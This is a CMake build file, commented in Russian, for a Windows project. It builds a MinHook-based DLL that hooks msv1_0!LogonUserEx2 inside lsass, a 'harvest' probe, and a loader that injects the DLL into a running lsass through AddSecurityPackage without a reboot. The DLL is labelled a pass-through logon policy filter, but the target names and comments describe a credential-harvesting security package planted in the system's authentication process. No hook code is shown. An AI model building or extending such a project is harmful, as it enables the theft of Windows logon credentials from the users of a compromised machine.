# CMakeLists.txt — открытие проекта в VS 2026 через "Open Folder" (нативная CMake-поддержка).
# Собирает: DLL пакета (ApHook) + пред-проверочный пробник харвеста.
cmake_minimum_required(VERSION 3.20)
project(ApHook C)

# Статический CRT (/MT) — минимум зависимостей для загрузки внутрь lsass.
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded")

# Путь к MinHook (заголовок + исходники амальгамируем прямо в DLL).
set(MH "${CMAKE_SOURCE_DIR}/third_party/minhook")

# --- пакет: LSA-фильтр политики входа (msv1_0!LogonUserEx2 hook, pass-through) ---
add_library(ApHook SHARED
    src/ApHook.c
    "${MH}/src/buffer.c"
    "${MH}/src/hook.c"
    "${MH}/src/trampoline.c"
    "${MH}/src/hde/hde64.c"
    src/ApHook.def)          # .def в списке исходников -> MSVC берёт его как список экспортов
target_include_directories(ApHook PRIVATE "${MH}/include")
target_compile_definitions(ApHook PRIVATE UNICODE _UNICODE)
target_link_libraries(ApHook PRIVATE kernel32)

# --- пред-проверочный пробник: идемпотентность msv1_0!SpLsaModeInitialize ---
add_executable(harvest_probe test/harvest_probe.c)
target_compile_definitions(harvest_probe PRIVATE SECURITY_WIN32)
target_link_libraries(harvest_probe PRIVATE Secur32)

# --- горячий загрузчик (AddSecurityPackage в живой lsass, без ребута) ---
add_executable(ssp_load tools/ssp_load.c)
target_compile_definitions(ssp_load PRIVATE SECURITY_WIN32)
target_link_libraries(ssp_load PRIVATE Secur32 Advapi32)
